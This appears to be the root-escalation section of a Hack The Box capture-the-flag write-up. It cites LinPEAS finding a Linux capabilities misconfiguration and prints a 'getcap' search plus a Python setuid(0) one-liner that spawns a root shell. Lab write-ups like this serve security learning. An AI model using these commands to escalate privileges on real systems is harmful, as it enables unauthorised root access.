# root

![](CUP-HTB-04.png)
- LinPEAS point towards a capabilities misconfiguration

![](CUP-HTB-05.png)

- PCAP article demonstrates how the misconfiguration could be exploited https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

````bash
getcap -r / 2>/dev/null 
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
````

![](CUP-HTB-06.gif)
